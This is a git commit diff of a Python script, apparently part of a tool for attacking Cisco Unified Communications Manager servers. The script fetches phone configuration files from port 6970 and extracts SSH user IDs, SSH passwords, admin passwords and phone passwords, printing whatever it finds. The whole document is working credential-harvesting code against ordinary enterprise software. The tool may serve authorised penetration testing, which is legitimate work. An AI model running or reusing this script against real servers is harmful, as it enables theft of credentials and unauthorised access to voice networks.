a9006da5251f9a79050726178a213079e71f303e
bgeary <bgeary@local>
2022-07-02 17:33:47 -0500

    test script -- search files

--- additions/search_files.py
+++ additions/search_files.py
@@ -19,21 +19,16 @@ def main():
     CUCM = args.host
     found_credentials = []
     found_usernames = []
+    secret = []
     config_files = ''
 
     config_files = get_config_names(CUCM)
     for file in config_files:
-        search_for_secrets(CUCM,file)
-    if found_credentials != []:
-        print('Credentials Found in Configurations!')
-        for cred in found_credentials:
-            print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))
-
-    if found_usernames != []:
-        print('Usernames Found in Configurations!')
-        for usernames in found_usernames:
-            print('{0}\t{1}'.format(usernames[0],usernames[1]))
-
+        secrets = search_for_secrets(CUCM,file)
+        for i in secrets:
+            if i not in secret:
+                secret.append(i)
+    print(secret)
 
 def get_config_names(CUCM_host,hostnames=None):
     config_names = []
@@ -54,7 +49,6 @@ def get_config_names(CUCM_host,hostnames=None):
         for file in file_names:
             if 'xml' in file or 'sgn' in file: #'cnf' in file or 'sgn' in file:
                 config_names.append(file)
-        print(config_names)
     else:
         for host in hostnames:
             config_names.append('{host}.cnf.xml'.format(host=host))
@@ -63,25 +57,27 @@ def get_config_names(CUCM_host,hostnames=None):
     else:
         return config_names
 
+
+
 def search_for_secrets(CUCM_host,filename):
-    global found_credentials
-    global found_usernames
+    search_strings = ['userid', 'password', 'admin', 'connection']
+    attr = []
     matches = []
-    lines = str()
-    user = str()
-    user2 = str()
-    password = str()
+
     url = "http://{0}:6970/{1}".format(CUCM_host,filename)
+
     try:
         __http_response = requests.get(url, timeout=10)
         lines = __http_response.text
-        for line in lines.split('\n'):
-            match = re.findall(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
-            if match != []:
-                matches.append(match)
+        content = BeautifulSoup(lines, 'lxml')
+        for text in search_strings:
+            for tag in content.find_all(re.compile(text)):
+                matches.append(tag)
+                print(tag.text)
 
     except Exception as e:
         print("Could not connect to http://{0}:6970/{1}".format(CUCM_host,filename))
-    print(matches)
+
+    return(matches)
 
 main()
